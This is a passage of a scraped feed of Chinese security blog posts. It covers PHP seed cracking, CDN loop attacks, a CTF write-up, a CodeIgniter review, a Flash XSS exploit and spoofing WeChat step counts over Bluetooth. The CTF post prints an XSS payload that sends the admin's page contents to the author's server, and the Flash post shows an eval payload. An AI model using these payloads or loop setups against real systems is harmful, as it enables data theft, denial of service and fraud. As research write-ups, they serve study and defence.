由于上述原因，之前用来爆破随机数种子的工具已经无法直接使用。我自己实现了一个多线程爆破种子的c程序，在4核2G内存的虚拟机上跑了大概4个小时才将种子遍历完毕。 random_int / random_bytesphp7 提供了更加安全的随机数产生函数，random_int和random_bytes调用了系统的一些安全的随机数产生函数来输出。 On Windows, » CryptGenRandom() will always be used. On Linux, the » getrandom(2) syscall will be used if available. On other platforms, /dev/urandom will be used. If none of the aforementioned sources are available, then an Exception will be thrown. php的运行模式对随机数产生的影响Apache2handler在/sapi/apache2handler/sapi_apache2.c中static int php_handler(request_rec *r)函数可以看到， 123456ctx = SG(server_context);parent_req = ctx-&gt;r;...if (!parent_req) &#123; php_apache_request_dtor(r); ... 只有在parent_req为NULL的情况下，才会运行到php_apache_request_dtor，调用php_request_shutdown，这个函数会调用注册的PHP_RSHUTDOWN_FUNCTION，导致随机数的种子被标记为未初始化。 在Apache下，一个 Connection 中的所有 request 都交给一个 Apache 的进程处理。很可能没有调用到php_apache_request_dtor导致在一个 Connection 中的请求共用一个种子。（未测试） php-fpm在/sapi/fpm/fpm/fpm_main.c中int main(int argc, char *argv[])函数可以看到，php-fpm的进程会循环处理请求，请求结束后调用php_request_shutdown函数进行清理。因此，在php-fpm的环境下，每个请求用的都是一个新的种子。 参考资料http://www.mscs.dal.ca/~selinger/random/http://www.openwall.com/php_mt_seed/https://github.com/lt/PHP-MT19937/tree/master/lib","categories":[{"name":"web","slug":"web","permalink":"http://5alt.me/categories/web/"}],"tags":[],"keywords":[{"name":"web","slug":"web","permalink":"http://5alt.me/categories/web/"}]},{"title":"CDN安全小结","slug":"CDN环路攻击","date":"2017-02-06T16:00:00.000Z","updated":"2019-08-16T04:24:28.784Z","comments":true,"path":"2017/02/CDN环路攻击/","link":"","permalink":"http://5alt.me/2017/02/CDN环路攻击/","excerpt":"CDN作为反向代理服务器，除非操作系统或者反向代理软件爆出严重的漏洞，其本身是不存在较大的安全问题的。扫描CDN服务器的端口往往会发现只开了80(http)和443(https)，而这两个端口又不运行动态脚本，作为攻击者很难从这里下手。 尽管CDN服务器看起来固若金汤，但是攻击CDN可以从CDN运行逻辑入手。CDN安全主要出现在环路攻击上，一旦流量形成环，则整个CDN会带着流量不断消耗自身的资源，造成拒绝服务。","text":"CDN作为反向代理服务器，除非操作系统或者反向代理软件爆出严重的漏洞，其本身是不存在较大的安全问题的。扫描CDN服务器的端口往往会发现只开了80(http)和443(https)，而这两个端口又不运行动态脚本，作为攻击者很难从这里下手。 尽管CDN服务器看起来固若金汤，但是攻击CDN可以从CDN运行逻辑入手。CDN安全主要出现在环路攻击上，一旦流量形成环，则整个CDN会带着流量不断消耗自身的资源，造成拒绝服务。 CDN环路攻击设置CDN的时候有几个概念。 加速域名 源站地址 CDN分配的动态解析域名 加速域名是用户控制的域名，用户将加速域名提交到CDN系统，系统会自动分配一个动态解析域名。这个动态解析的域名会根据来源IP的地区以及CDN节点负载情况动态解析成CDN某个节点的IP。用户需要将加速域名的CNAME记录指向云服务分配的动态解析域名，这样当用户请求加速域名的时候，其对应的ip地址由动态解析域名进行解析。这样用户浏览器端的请求就会发送到CDN的一个节点上，然后由该节点向源站地址代理发出请求，得到响应之后返回给用户。 分析上面的过程，可以总结出CDN环路攻击有5种形式。 CDN自身成环将CDN的加速域名与源站域名设置成同一个，源站域名A记录指向CDN的一个节点。这样，当请求加速域名的时候，CDN节点解析到源站的IP为其自身的IP，循环自己请求自己，导致环路。 CDN之间成环将CDN的加速域名与源站域名设置成同一个，自己搭建DNS服务器，域名的NS记录指向自己的DNS服务器，即攻击者可以动态解析源站域名为需要的IP。根据CDN分配的动态解析域名可以得到多个绑定了该加速域名的CDN节点的IP，对每次加速域名的解析随机返回收集的CDN节点IP中的一个。这样，用户的HTTP请求的数据包就在CDN之间互相传递，如果控制好DNS解析的规律，则能形成一个环路，使数据包一直传递下去。 另外一种攻击方法是新建两个CDN加速域名，将源站指向对方，并通过动态解析域名的解析记录寻找两个加速域名的公共CDN节点的IP。搭建DNS服务器动态解析这两个域名，使其A记录随机返回公共IP里的一个。这样只要访问其中一个域名即可让流量在这些公共IP之间流动起来。 不同CDN商之间成环如果CDN服务商对自身http包传递次数做了一些限制，而有的CDN商可以去除掉这些限制的话，可以考虑在不同CDN商之间将流量成环。 CDN和源站成环如果能控制源站或者源站有SSRF的漏洞，正常配置CDN服务，把源站也变成一个反向代理服务器，地址指向CDN的一个节点。这样用户发起请求，CDN请求源站，源站又回过头来请求CDN。这样能较快的耗尽源站的资源，并且可能拖住一个CDN的节点。 DNS loop将a的CNAME记录设置成b，b的CNAME记录设置成c，c的CNAME记录设置成a。向CDN的一个节点发送请求a的数据包，则CDN会不断循环查询DNS，对DNS服务器造成较大的流量。 CDN测试遇到的坑在最开始测试CDN环路攻击的时候，新建了多个加速域名，把加速域名的源站设置成下一个加速域名，依次连接起来，然后把最后一个加速域名的源站设置成自己控制的服务器。在服务器上监听端口，请求第一个加速域名，却没有收到任何请求。这个问题纠结了很长时间，直到意识到在b加速域名的CDN节点上可能没有a加速域名的信息。这样从a到b的请求会被丢弃掉，导致无法将流量传递。 如果CDN允许配置回源host的话，那么CDN环路攻击依然可以生效。 CDN环路攻击的解决方案从攻击的方法上可以看到，阻止CDN的HTTP loop最简单的方法是禁止CDN的加速域名与源站域名设置成同一个。除此之外，实际上还需要做一些其他的防护手段来避免CDN之间成环。 阿里云会在HTTP请求头中加一个Via项，里面记录了这个请求经过的节点信息。如果节点检测到Via中和本节点的特征匹配的话，则直接返回HTTP/1.1 508 Loop Detected。经过测试发现阿里云会把多个的Via项拼起来，尝试干扰服务器对Via的判断没有成功。 通过Via来判断是一个比较好的解决思路，也是RFC中推荐的方法。有的CDN会在HTTP请求头里加一项特殊的X-Daa-Tunnel: hop_count=1头来计数，用户可以自己指定一个非常小的负数，CDN节点需要一点一点加很久才能达到阈值，导致仍然可以受到攻击。 解决好环路的判断问题是避免CDN流量转发放大造成DoS的根本。 参考文献 http://netsec.ccert.edu.cn/duanhx/files/2010/12/cdn_loop-final-camera-ready.pdf https://www.internetsociety.org/sites/default/files/04_2-ndss2016-slides.pdf https://jiji262.github.io/wooyun_articles/drops/CDN%E6%B5%81%E9%87%8F%E6%94%BE%E5%A4%A7%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF.html","categories":[{"name":"云安全","slug":"云安全","permalink":"http://5alt.me/categories/云安全/"}],"tags":[],"keywords":[{"name":"云安全","slug":"云安全","permalink":"http://5alt.me/categories/云安全/"}]},{"title":"基于csv的信息泄露已死","slug":"基于csv的信息泄露已死","date":"2017-01-07T16:00:00.000Z","updated":"2019-08-16T04:24:28.787Z","comments":true,"path":"2017/01/基于csv的信息泄露已死/","link":"","permalink":"http://5alt.me/2017/01/基于csv的信息泄露已死/","excerpt":"前几天做33c3 ctf中的一道web题vault，遇到了一个比较好玩的前端的思路。 题目是一个用户管理系统，用户可以存储一段secret在数据库里。在联系管理员的页面可以提交一个网址，后台会用phantomjs去访问这个页面。题目能通过文件包含漏洞拿到源码，并发现有一个管理员的后台页面可以导出用户的信息以及用户存储的secret。题目的目标是拿到管理员的secret。","text":"前几天做33c3 ctf中的一道web题vault，遇到了一个比较好玩的前端的思路。 题目是一个用户管理系统，用户可以存储一段secret在数据库里。在联系管理员的页面可以提交一个网址，后台会用phantomjs去访问这个页面。题目能通过文件包含漏洞拿到源码，并发现有一个管理员的后台页面可以导出用户的信息以及用户存储的secret。题目的目标是拿到管理员的secret。 来看后台页面导出用户信息的逻辑。 1234567891011if (isset($_GET[&quot;ids&quot;])) &#123; $export = &quot;&quot;; foreach(explode(&quot;,&quot;, $_GET[&quot;ids&quot;]) as $id) &#123; $export .= &quot;\\&quot;&quot; . implode(&quot;\\&quot;,\\&quot;&quot;, array_values(get_user($id))) .&quot;\\&quot;\\n&quot;; &#125; header(&apos;Content-Disposition: attachment; filename=&quot;users.csv&quot;&apos;); header(&apos;Content-Type: text/csv&apos;); header(&quot;Content-Length: &quot; . strlen($export)); echo $export; exit; 根据代码可以看到，只要提交用户以逗号分隔的id，就会用get_user函数取出对应的信息并导出成csv格式。 get_user函数对应的代码如下。 123456789101112131415161718192021function get_user($user_id) &#123; global $redis; if (logged_in()) &#123; $username = $redis-&gt;hget(&quot;user:&#123;$user_id&#125;&quot;, &quot;username&quot;); $password = $redis-&gt;hget(&quot;user:&#123;$user_id&#125;&quot;, &quot;password&quot;); $fname = $redis-&gt;hget(&quot;user:&#123;$user_id&#125;&quot;, &quot;fname&quot;); $lname = $redis-&gt;hget(&quot;user:&#123;$user_id&#125;&quot;, &quot;lname&quot;); $secret = $redis-&gt;hget(&quot;user:&#123;$user_id&#125;&quot;, &quot;secret&quot;); $isadmin = $redis-&gt;hget(&quot;user:&#123;$user_id&#125;&quot;, &quot;isadmin&quot;); return array(&quot;id&quot; =&gt; $user_id, &quot;username&quot; =&gt; $username, &quot;password&quot; =&gt; $password, &quot;fname&quot; =&gt; $fname, &quot;lname&quot; =&gt; $lname, &quot;secret&quot; =&gt; $secret, &quot;isadmin&quot; =&gt; $isadmin); &#125; return NULL;&#125; 在get_user函数里，并没有对参数$user_id进行过滤，直接返回到结果里，被输出到csv中。 这里比较重要的一点是，csv的格式与javascript是兼容的。在有些浏览器里，通过&lt;script src=引入一个合法的csv文件是不报错的。我们可以通过这个特性来获取到csv文件里的一些敏感信息。 现在问题简化为，以下数据中，aaa和bbb的两个地方可控，可以是除了逗号的任意字符，目标是将数据以&lt;script src=引入，然后获取secret。123&quot;aaa&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;&quot;1&quot;,&quot;admin&quot;,&quot;salt&quot;,&quot;salt&quot;,&quot;salt&quot;,&quot;secret&quot;,&quot;salt&quot;&quot;bbb&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot; 现在面临的一个小问题是，每一行结束之后都会有一个换行，如果想把第二行的数据包含在单引号里或者函数里，都会出现语法错误。 12345678&quot;&quot;;aaa=&apos;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;&quot;1&quot;,&quot;admin&quot;,&quot;salt&quot;,&quot;salt&quot;,&quot;salt&quot;,&quot;secret&quot;,&quot;salt&quot;&quot;&apos;);alert(aaa)//&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;&quot;&quot;;aaa=&apos;&apos;.concat(&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;&quot;1&quot;,&quot;admin&quot;,&quot;salt&quot;,&quot;salt&quot;,&quot;salt&quot;,&quot;secret&quot;,&quot;salt&quot;&quot;&quot;);alert(aaa)//&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot; 当然，这个问题的解决方法也很简单，用ES6中字符串模板的方式即可。123&quot;&quot;;aaa=`&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;&quot;1&quot;,&quot;admin&quot;,&quot;salt&quot;,&quot;salt&quot;,&quot;salt&quot;,&quot;secret&quot;,&quot;salt&quot;&quot;`;alert(aaa)//&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot; 本地浏览器下测试成功，但服务器上死活拿不到secret。后来才发现，最新的chrome里已经不允许&lt;script src=的页面的Content-Type是csv了。。一个非常好玩的前端利用思路就这样死了 = = 当然，这道题的最终解法是火日巨佬的另外一种思路。题目里的查看资料的页面没有对用户名进行过滤，注册的时候也没有对用户名做任何限制。因此在查看资料的页面有一个用户名的self-xss。 利用思路是，在自己的页面中加一个iframe。第一个iframe为secret页面，此时获取的是管理员的secret页面。在第一个iframe加载完毕后，加载第二个iframe，作用是用自动提交表单的方式来登录一个用户名含有payload的用户。等第二个iframe加载完之后，访问查看资料的页面，此时查看的是恶意用户的资料，触发payload代码。payload代码的内容是，通过window.top的方式访问第一个iframe的内容，获取到旧页面中的管理员的secret并发送回来。 123456789101.html&lt;iframe src=&quot;http://78.46.224.71/?page=secret&quot;&gt;&lt;/iframe&gt;&lt;iframe src=&quot;2.html&quot; onload=&quot;(document.body.appendChild(document.createElement(&apos;iframe&apos;)).src=&apos;http://78.46.224.71/?page=profile&apos;);&quot;&gt;&lt;/iframe&gt;2.html&lt;form id=&quot;exploit&quot; action=&quot;http://78.46.224.71/?page=login&quot; method=&quot;POST&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;username&quot; value=&quot;&lt;script&gt;new Image().src=&apos;//x.5alt.me:9999/&apos;+escape(window.top.frames[0].document.documentElement.innerHTML)&lt;/script&gt;&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;password&quot; value=&quot;111&quot; /&gt; &lt;/form&gt; &lt;script&gt;document.getElementById(&apos;exploit&apos;).submit();&lt;/script&gt; 参考资料https://bugzilla.mozilla.org/show_bug.cgi?id=1232785","categories":[{"name":"web","slug":"web","permalink":"http://5alt.me/categories/web/"}],"tags":[],"keywords":[{"name":"web","slug":"web","permalink":"http://5alt.me/categories/web/"}]},{"title":"CodeIgniter 框架阅读","slug":"CodeIgniter代码阅读笔记","date":"2016-12-29T16:00:00.000Z","updated":"2019-08-16T04:24:28.784Z","comments":true,"path":"2016/12/CodeIgniter代码阅读笔记/","link":"","permalink":"http://5alt.me/2016/12/CodeIgniter代码阅读笔记/","excerpt":"对web框架的安全，我主要关注了以下方面。 开发者如何拿到输入，框架对输入的处理方式 框架如何处理路由 框架如何封装数据库查询 框架对常见操作的处理（session，文件上传） 阅读的思路是先看整体框架的结构，然后通过看官方文档的描述然后找到对应代码阅读。","text":"对web框架的安全，我主要关注了以下方面。 开发者如何拿到输入，框架对输入的处理方式 框架如何处理路由 框架如何封装数据库查询 框架对常见操作的处理（session，文件上传） 阅读的思路是先看整体框架的结构，然后通过看官方文档的描述然后找到对应代码阅读。 输入类 输入类有两个用途： 为了安全性，对输入数据进行预处理 提供了一些辅助方法来获取输入数据并处理 安全性过滤当访问 控制器 时，安全过滤方法会自动被调用， 它做了以下几件事情： 如果 $config[&#39;allow_get_array&#39;] 设置为 FALSE （默认是 TRUE），销毁全局的 GET 数组。 当开启 register_globals 时，销毁所有的全局变量。 过滤 GET/POST/COOKIE 数据的键值，只允许出现字母和数字（和其他一些）字符。 提供了 XSS （跨站脚本攻击）过滤，可全局启用，或按需启用。 将换行符统一为 PHP_EOL （基于 UNIX 的系统下为 \\n，Windows 系统下为 \\r\\n），这个是可配置的。 XSS 过滤输入类可以自动的对输入数据进行过滤，来阻止跨站脚本攻击。如果你希望在每次遇到 POST 或 COOKIE 数据时自动运行过滤，你可以在 application/config/config.php 配置文件中设置如下参数:$config[&#39;global_xss_filtering&#39;] = TRUE; 首先CI会对$_GET、$_POST、$_COOKIE的key和value进行处理，对应代码为$this-&gt;_sanitize_globals();。对key处理的正则是/^[a-z0-9:_\\/|-]+$/i，即只允许字母和数字，波浪符（~），百分号（%），句号（.），分号（:），下划线（_），连字号（-），空格。在key中一旦出现了非法字符就会exit。 对value用remove_invisible_characters进行处理。该函数会把无法打印的字符替换成空。无法打印的字符定义如下。$non_displayables[] = &#39;/[\\x00-\\x08\\x0B\\x0C\\x0E-\\x1F\\x7F]+/S&#39;; // 00-08, 11, 12, 14-31, 127 由此可见，可以在value中插入一些不可见字符，而不影响value的结果。这个性质可以用来bypass一些流量过滤型的waf。 输入类里还定义了一个is_ajax_request()的函数用于判断是否是ajax请求，判断方式是strtolower($_SERVER[&#39;HTTP_X_REQUESTED_WITH&#39;]) === &#39;xmlhttprequest&#39;。 参考页面http://codeigniter.org.cn/user_guide/libraries/input.htmlhttp://codeigniter.org.cn/user_guide/general/security.html 路由类URI 分段 example.com/class/function/ID 第一段表示要调用的控制器 类 ； 第二段表示要调用的类中的 函数 或 方法 ； 第三段以及后面的段代表传给控制器的参数，如 ID 或其他任何变量，可以传递多个参数； 即通过URL就能访问到控制器中的某个函数并能提供String类型的参数。如果启用了查询字符串（ application/config.php 配置文件中$config[&#39;enable_query_strings&#39;] = TRUE;，默认关闭），那么可以输入数组类型的参数。 其中不能通过URL直接访问到的私有方法的标志是方法声明为 private 或 protected 或者方法名前加上一个下划线前缀。 CI框架会对URI的每个segment进行过滤，$config[&#39;permitted_uri_chars&#39;] = &#39;a-z 0-9~%.:_\\-&#39;;。如果URI里有非法字符会直接400。 URI 路由 路由规则定义在 application/config/routes.php 文件中，在这个文件中你会 发现一个名为 $route 的数组，利用它你可以设置你自己的路由规则。 在路由规则中你可以使用通配符或正则表达式。 $route[&#39;product/:num&#39;] = &#39;catalog/product_lookup&#39;;自定义的路由可以用正则或者通配符，对应处理的函数也可以动态生成。 在路由中使用 HTTP 动词$route[&#39;products&#39;][&#39;put&#39;] = &#39;product/insert&#39;;。 参考页面http://codeigniter.org.cn/user_guide/general/urls.htmlhttp://codeigniter.org.cn/user_guide/general/routing.html 数据库查询CI框架在进行数据库查询的时候没有对表名和列名进行处理，凡是能控制表名或者列名的地方都能引发注入。在一些传输数组进行查询的地方，如$this-&gt;db-&gt;where($array);或者$this-&gt;db-&gt;like($array);，有可能从输入中引入表名。但是由于对数组的key的检查，导致很难通过注入列名的方式来攻击。因此，对于CI框架，SQL注入主要发生在字符串拼接语句并带入查询的时候。 如果存在反序列化漏洞，可能可以通过找一个能__toString的类来实例化，绕过对输入的escape。CI框架本身的类里不存在__toString方法。 参考页面http://codeigniter.org.cn/user_guide/database/index.html 上传类CI的上传类会对上传后文件的原始文件名进行sanitize_filename处理，而sanitize_filename函数没有对windows下目录分隔符为\\的情况进行处理，导致文件名即使经过sanitize_filename过滤，在windows下用..\\..切换目录仍然可行。即上传的文件原始文件名如果包含..\\..则保存的文件可能逃逸当前目录。但是实际测试发现，php会对上传后的文件名进行取basename的操作，导致不能出现..\\。所以在此处并不能被利用。php对此这样处理的原因是在IE浏览器中，上传文件会附带文件的全路径。根据php代码里的注释，取basename的操作可能在以后版本中取消。 参考页面http://codeigniter.org.cn/user_guide/libraries/file_uploading.htmlhttps://github.com/php/php-src/blob/6053987bc27e8dede37f437193a5cad448f99bce/main/rfc1867.c#L1156 杂七杂八CI框架提供了hook的功能。 pre_system 在系统执行的早期调用，这个时候只有 基准测试类 和 钩子类 被加载了， 还没有执行到路由或其他的流程。 pre_controller 在你的控制器调用之前执行，所有的基础类都已加载，路由和安全检查也已经完成。 post_controller_constructor 在你的控制器实例化之后立即执行，控制器的任何方法都还尚未调用。 post_controller 在你的控制器完全运行结束时执行。 display_override 覆盖 _display() 方法，该方法用于在系统执行结束时向浏览器发送最终的页面结果。 这可以让你有自己的显示页面的方法。注意你可能需要使用 $this-&gt;CI =&amp; get_instance() 方法来获取 CI 超级对象，以及使用 $this-&gt;CI-&gt;output-&gt;get_output() 方法来 获取最终的显示数据。 cache_override 使用你自己的方法来替代 输出类 中的 _display_cache() 方法，这让你有自己的缓存显示机制。 post_system 在最终的页面发送到浏览器之后、在系统的最后期被调用。 在测试的时候做一些hook进行一些比较高级的操作。比如可以通过display_override来获取页面的输出，检测页面上可能出现的敏感的信息。 参考页面http://codeigniter.org.cn/user_guide/general/hooks.html 总结CI框架的代码整体看下来安全性较高，由于对用户的输入做了一些过滤，导致很多可能出现的问题难以被利用。对于一些没有考虑到的问题，还希望能与大佬们交流。","categories":[{"name":"web","slug":"web","permalink":"http://5alt.me/categories/web/"}],"tags":[],"keywords":[{"name":"web","slug":"web","permalink":"http://5alt.me/categories/web/"}]},{"title":"一个flash xss的利用","slug":"一个flash xss的利用","date":"2016-12-19T16:00:00.000Z","updated":"2019-08-16T04:24:28.786Z","comments":true,"path":"2016/12/一个flash xss的利用/","link":"","permalink":"http://5alt.me/2016/12/一个flash xss的利用/","excerpt":"从几个星期前就心心念念找一个flash xss来玩，现在flash用的比较少了，自己也懒得每开一个页面就看下有没有swf文件加载进来，于是就简单写了个油猴脚本辅助检测。思路是用的EtherDream大神在微博说的获取所有请求的方法。","text":"从几个星期前就心心念念找一个flash xss来玩，现在flash用的比较少了，自己也懒得每开一个页面就看下有没有swf文件加载进来，于是就简单写了个油猴脚本辅助检测。思路是用的EtherDream大神在微博说的获取所有请求的方法。12345678910111213(function() &#123; setTimeout(function()&#123; var urls = performance.getEntries() have_flash = false; urls.forEach(function(e)&#123; if(e.name.indexOf(\".swf\") !== -1)&#123; have_flash = true; console.warn(\"%c\"+location.hostname+' 发现Flash:'+e.name,\"color:red;font-size:13px\"); &#125; &#125;) if(have_flash) alert(\"Flash found!\"); &#125;, 5000)&#125;)() 最后在某网站找到一个预览文档的flash文件。http://5alt.com/flash/vul.swf?attachment_id=109246&amp;base_url=http://5alt.com/&amp;nick=5alt&amp;place=&amp;reference=http://5alt.me/233在文档预览的时候，flash会发送请求获取一个新的swf文件作为文档的数据加载进来。从flash请求的参数上来看就知道这个flash非常可疑。用JPEXS反编译可得到如下关键代码。 1234567891011121314151617181920212223242526272829303132333435363738var g_base_url = !_root.base_url;...function loadSlide(slideIndex)&#123; sessionLV.sendAndLoad(g_base_url + \"apis/ppt_viewer/data.php\",timeLV,\"GET\"); timeLV.onLoad = function(success) &#123; if(success) &#123; time = timeLV.number; var _loc1_ = encryption.hash(private_key + g_fileName + time); get_swf_file(slideIndex,_loc1_); &#125; &#125;;&#125;function get_swf_file(slideIndex, key)&#123; var _loc4_ = \"swf/\" + g_fileName + slideIndex + \".swf\"; var _loc3_ = g_base_url + \"apis/ppt_viewer/data.php?page=\" + slideIndex + \"&amp;filename=\" + g_fileName + \"&amp;id=\" + g_attachment_id + \"&amp;key=\" + key; var _loc2_ = new MovieClipLoader(); _loc2_.addListener(this); if(g_currentPageloadNo % 2 == 0) &#123; _loc2_.loadClip(_loc3_,this.evenSliderMC); &#125; else &#123; _loc2_.loadClip(_loc3_,this.oddSliderMC); &#125;&#125;resultLV.onLoad = function(success)&#123; if(success) &#123; ... loadSlide(1); &#125;&#125;; 总结一下就是swf加载完成后会去远程获取一个文件加载成为一个新的MovieClip。加载文件的url为g_base_url然后拼接上一个固定的地址，g_base_url即为参数base_url。因此我们可以通过控制base_url来让这个flash加载我们指定的swf文件，从而触发xss。 思路有了，接下来开始模拟环境进行测试。首先遇到第一个坑，自己编写的swf文件无法加载运行。我自己对flash不太熟，也不知道怎么编写一个可以被加载运行的swf文件，于是选择从可以加载作为文档数据的swf入手。然后遇到第二个坑，用burpsuite抓的包解码保存成swf文件是坏掉的，调了半天也不知道为什么，用wireshark抓出来的swf就是好的。JPEXS有个黑科技，可以修改反编译出来的actionscript代码然后打包回去。于是在抓到合法的swf文件基础上加上了一段测试用的执行js的代码。 1flash.external.ExternalInterface.call(\"eval\",\"alert(document.domain)\"); 在测试的时候，将有问题的swf文件和后来加载的swf文件都放在本地的server上，测试可以弹窗，但是如果这两个文件域不一样的话，js就不能执行。这里又有一个flash域的坑。加载不同域上的swf文件不能执行js，于是就想办法变成同域。网站正好有上传图片的功能，将插好恶意代码的swf文件改后缀成png传上去发现内容没有被修改，这样就有了一个同域的swf文件。然后就是想办法加载这个swf文件了。 由于我们只能控制base_url，而不能控制后面的路径，所以只能想办法将加载swf的请求跳转到上传后的文件上去。在这里可以自己搭建一个server，302跳转过去。 于是就可以愉快的弹窗了。 当然，利用这个网站上传图片不修改内容的特点，还可以用flash获取站点网页的内容。详细见irsdl的poc。 参考文档https://www.secpulse.com/archives/44299.htmlhttps://www.cnblogs.com/index-html/p/swf-reflect-priv.htmlhttps://github.com/evilcos/papers/blob/master/%E9%9A%90%E8%94%BD%E7%9A%84%E6%88%98%E5%9C%BA%E2%80%94Flash%20Web%E6%94%BB%E5%87%BB.pptxhttps://xianzhi.aliyun.com/forum/read/224.html","categories":[{"name":"web","slug":"web","permalink":"http://5alt.me/categories/web/"}],"tags":[],"keywords":[{"name":"web","slug":"web","permalink":"http://5alt.me/categories/web/"}]},{"title":"利用蓝牙模拟手环伪造微信运动步数","slug":"利用蓝牙模拟手环伪造微信运动步数","date":"2016-12-08T16:00:00.000Z","updated":"2019-08-16T04:24:28.787Z","comments":true,"path":"2016/12/利用蓝牙模拟手环伪造微信运动步数/","link":"","permalink":"http://5alt.me/2016/12/利用蓝牙模拟手环伪造微信运动步数/","excerpt":"伪造微信运动步数的方法有很多种，可以hook系统提供步数统计的模块，可以伪造GPS，可以找第三方手环的漏洞。第三方手环走微信iot平台AirSync协议的话可能通信过程启用AES加密，很难对其攻击。于是考虑自己成为一个手环设备生产商并伪造一个运动手环，欺骗微信运动来获取假的运动步数。","text":"伪造微信运动步数的方法有很多种，可以hook系统提供步数统计的模块，可以伪造GPS，可以找第三方手环的漏洞。第三方手环走微信iot平台AirSync协议的话可能通信过程启用AES加密，很难对其攻击。于是考虑自己成为一个手环设备生产商并伪造一个运动手环，欺骗微信运动来获取假的运动步数。 微信平台配置此部分内容主要参考微信iot平台文档。 公众号后台开通“设备功能”插件如果没有认证过的公共号，也可以用公众号测试账号。http://mp.weixin.qq.com/debug/cgi-bin/sandbox?t=sandbox/login添加设备时，需要指明接入方案，选平台基础接入方案，连接类型选蓝牙，产品配置选蓝牙发现。登记成功后会得到一个微信硬件的型号编码即product_id。 获取access_tokenhttps://api.weixin.qq.com/cgi-bin/token?grant_type=client_credential&amp;appid=&amp;secret=获取完access_token之后，接下来从微信公共号后台找到自己的openid。 获取deviceid和二维码https://api.weixin.qq.com/device/getqrcode?access_token=&amp;product_id=得到如下返回。1&#123;&quot;base_resp&quot;:&#123;&quot;errcode&quot;:0,&quot;errmsg&quot;:&quot;ok&quot;&#125;,&quot;deviceid&quot;:&quot;gh_eee2c24a6f8e_852ddc34836c0559&quot;,&quot;qrticket&quot;:&quot;http:\\/\\/we.qq.com\\/d\\/AQC5K_3BgSGNsg84sHISxXmHwMJrSp5sDf9AX1sB&quot;&#125; 微信平台会分配一个deviceid和对应的二维码qrticket，在绑定用户的时候用到。 设备授权https://api.weixin.qq.com/device/authorize_device?access_token=POST数据1234567891011121314151617181920&#123; &quot;device_num&quot;:&quot;1&quot;, &quot;device_list&quot;:[ &#123; &quot;id&quot;:&quot;gh_eee2c24a6f8e_852ddc34836c0559&quot;, &quot;mac&quot;:&quot;ff8d22e19590&quot;, &quot;connect_protocol&quot;:&quot;3&quot;, &quot;auth_key&quot;:&quot;&quot;, &quot;close_strategy&quot;:&quot;1&quot;, &quot;conn_strategy&quot;:&quot;5&quot;, &quot;crypt_method&quot;:&quot;0&quot;, &quot;auth_ver&quot;:&quot;0&quot;, &quot;manu_mac_pos&quot;:&quot;-1&quot;, &quot;ser_mac_pos&quot;:&quot;-2&quot;, &quot;ble_simple_protocol&quot;: &quot;1&quot; &#125; ], &quot;op_type&quot;:&quot;1&quot;, &quot;product_id&quot;: &quot;25806&quot;&#125; 主要为开启蓝牙精简协议。在数据包里配置好id、mac和product_id即可。mac为电脑蓝牙的mac地址。协议的具体内容参照微信文档。 强制绑定用户和设备https://api.weixin.qq.com/device/compel_bind?access_token=POST数据1234&#123; &quot;device_id&quot;: &quot;gh_eee2c24a6f8e_852ddc34836c0559&quot;, &quot;openid&quot;: &quot;ouSvtwWqDVHQUGT3u0XkTpiJ9QsY&quot;&#125; 在数据包里配置好device_id和openid。 这样，微信账号就与设备绑定好了。打开公共号会看到公共号下面有个“未连接”的字符串。 伪造手环设备根据微信蓝牙精简协议文档 设备需要广播包带上微信的service，并在manufature data里带上mac地址。微信Service uuid：0xFEE7manufature specific data：需以MAC地址（6字节）结尾。并且manufature specific data长度需大于等于8字节（最前两个字节为company id，没有的话随便填）。微信service下面需包含一个读特征值，uuid为：0xFEC9，内容为6字节MAC地址（ios系统其他软件连上设备之后，微信会去读该特征值，以确定设备MAC地址）。 所以只需要建立一个uuid为0xFEE7的service，里面包含0xFEA1、0xFEA2、0xFEC9三个Characteristic并设置好值和属性即可。 利用paypal开源的gatt，修改example里的server.go，在脚本里设置好蓝牙的mac和想要的步数，运行即可。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105package mainimport ( \"fmt\" \"log\" \"github.com/paypal/gatt\" \"github.com/paypal/gatt/examples/option\")func main() &#123; mac := []byte&#123;0x13, 0x37, 0xde, 0xad, 0xbe, 0xef&#125; // steps little endian // 01 （步数）10 27 00（1万步） 0x002710 = 10000 // http://iot.weixin.qq.com/wiki/new/index.html?page=4-3 steps := []byte&#123;0x01, 0x10, 0x27, 0x00&#125; const ( flagLimitedDiscoverable = 0x01 // LE Limited Discoverable Mode flagGeneralDiscoverable = 0x02 // LE General Discoverable Mode flagLEOnly = 0x04 // BR/EDR Not Supported. Bit 37 of LMP Feature Mask Definitions (Page 0) flagBothController = 0x08 // Simultaneous LE and BR/EDR to Same Device Capable (Controller). flagBothHost = 0x10 // Simultaneous LE and BR/EDR to Same Device Capable (Host). ) d, err := gatt.NewDevice(option.DefaultServerOptions...) if err != nil &#123; log.Fatalf(\"Failed to open device, err: %s\", err) &#125; // Register optional handlers. d.Handle( gatt.CentralConnected(func(c gatt.Central) &#123; fmt.Println(\"Connect: \", c.ID()) &#125;), gatt.CentralDisconnected(func(c gatt.Central) &#123; fmt.Println(\"Disconnect: \", c.ID()) &#125;), ) // A mandatory handler for monitoring device state. onStateChanged := func(d gatt.Device, s gatt.State) &#123; fmt.Printf(\"State: %s\\n\", s) switch s &#123; case gatt.StatePoweredOn: s0 := gatt.NewService(gatt.UUID16(0xFEE7)) c0 := s0.AddCharacteristic(gatt.UUID16(0xFEA1)) c0.HandleReadFunc( func(rsp 